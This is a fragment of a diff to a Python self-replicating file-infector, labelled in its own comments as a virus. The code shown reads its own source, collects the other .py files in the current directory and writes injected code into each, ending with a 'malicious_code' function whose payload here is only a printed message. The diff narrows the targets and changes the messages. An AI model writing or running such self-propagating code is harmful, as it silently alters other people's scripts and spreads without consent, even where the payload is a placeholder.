@@ -17,8 +17,8 @@ with open(sys.argv[0], "r") as f:
             print("Ending")
             break
 
-print(virus_lines)
-files = glob.glob('*.py') + glob.glob('*.pyw')
+
+files = glob.glob('*.py')
 
 for file in files:
     if file != sys.argv[0]:    
@@ -40,7 +40,7 @@ for file in files:
             f.writelines(final_code)
 
 def malicious_code():
-    print("You have been infected!!")
+    print("This shall do something malicious... hehehe")
 
 malicious_code()
 # Virus end
